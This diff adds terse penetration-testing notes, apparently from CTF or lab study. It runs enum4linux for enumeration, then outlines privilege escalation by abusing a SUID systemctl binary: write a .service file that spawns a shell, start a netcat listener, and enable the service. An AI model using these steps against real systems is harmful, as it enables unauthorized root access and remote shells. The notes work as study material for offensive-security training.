@@ -1,0 +1,11 @@
+enum4linux -A [IP]
+
+1. Look for SUID bits
+2. Found systemctl with SUID set?
+> create .service file with shell for RCE locally
+>copy and paste file contents or wget the file with python3 -m http.server in the local folder
+> chmod 400 myservice.service
+> nc -lvnp [PORT]
+> /bin/systemctl enable myservice.service
+
+
